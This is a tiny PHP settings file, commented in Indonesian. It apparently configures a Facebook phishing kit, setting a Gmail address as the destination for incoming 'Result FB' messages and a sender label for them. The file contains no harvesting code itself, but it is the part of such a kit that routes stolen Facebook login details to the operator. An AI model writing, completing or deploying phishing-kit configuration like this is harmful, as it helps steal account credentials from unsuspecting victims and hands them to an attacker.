<?php
$emailku = 'alfamartmulung01@gmail.com';     // email tujuan
$from = 'Result FB'; // nama result yg masuk
?>

